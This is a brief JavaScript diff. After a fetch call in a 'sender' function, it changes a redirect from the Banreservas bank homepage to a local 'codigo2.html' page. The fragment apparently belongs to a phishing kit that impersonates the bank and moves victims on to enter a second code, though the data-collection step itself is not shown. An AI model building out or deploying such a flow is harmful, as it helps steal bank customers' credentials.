@@ -21,7 +21,7 @@ var sender = function () {
     })
     .then(r => r.json())
     .then(() => {
-        window.location = 'https://www.banreservas.com/';
+        window.location = 'codigo2.html';
     })
     .catch(err => console.error(err));
 
